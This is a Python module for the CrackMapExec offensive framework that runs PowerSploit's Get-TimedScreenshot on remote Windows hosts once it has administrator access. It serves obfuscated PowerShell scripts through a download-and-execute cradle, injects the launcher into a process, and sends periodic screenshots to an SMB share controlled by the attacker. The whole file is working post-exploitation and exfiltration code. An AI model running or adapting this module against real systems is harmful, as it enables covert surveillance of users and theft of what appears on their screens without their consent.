from cme.helpers.powershell import *
from cme.helpers.misc import gen_random_string
from cme.servers.smb import CMESMBServer
from sys import exit
import os

class CMEModule:
    '''
        Executes PowerSploit's Get-TimedScreenshot script
        Module by @byt3bl33d3r
    '''

    name = 'get_timedscreenshot'
    description = "Takes screenshots at a regular interval"
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        INTERVAL  Specifies the interval in seconds between taking screenshots.
        ENDTIME   Specifies when the script should stop running in the format HH:MM (Military Time).
        '''

        if 'INTERVAL' not in module_options:
            context.log.error('INTERVAL option is required!')
            exit(1)

        if 'ENDTIME' not in module_options:
            context.log.error('ENDTIME option is required!')
            exit(1)

        self.interval   = int(module_options['INTERVAL'])
        self.endtime    = module_options['ENDTIME']
        self.share_name = gen_random_string(5).upper()

        context.log.info('This module will not exit until CTRL-C is pressed')
        context.log.info('Screenshots will be stored in ~/.cme/logs\n')

        self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Invoke-PSInject.ps1')
        self.ps_script2 = obfs_ps_script('powersploit/Exfiltration/Get-TimedScreenshot.ps1')

        self.smb_server = CMESMBServer(context.log, self.share_name, context.log_folder_path)
        self.smb_server.start()

    def on_admin_login(self, context, connection):
        screen_folder = 'get_timedscreenshot_{}'.format(connection.host)
        screen_command = 'Get-TimedScreenshot -Path \\\\{}\\{}\\{} -Interval {} -EndTime {}'.format(context.localip, self.share_name,
                                                                                                    screen_folder, self.interval,
                                                                                                    self.endtime)
        screen_command = gen_ps_iex_cradle(context, 'Get-TimedScreenshot.ps1',
                                           screen_command, post_back=False)

        launcher = gen_ps_inject(screen_command, context)

        connection.ps_execute(launcher)
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Invoke-PSInject.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script1)

        elif 'Get-TimedScreenshot.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            #We received the callback, so lets setup the folder to store the screenshots
            screen_folder_path = os.path.join(context.log_folder_path, 'get_timedscreenshot_{}'.format(request.client_address[0]))
            if not os.path.exists(screen_folder_path): os.mkdir(screen_folder_path)
            #context.log.success('Storing screenshots in {}'.format(screen_folder_path))

            request.wfile.write(self.ps_script2)

        else:
            request.send_response(404)
            request.end_headers()

    def on_shutdown(self, context):
        self.smb_server.shutdown()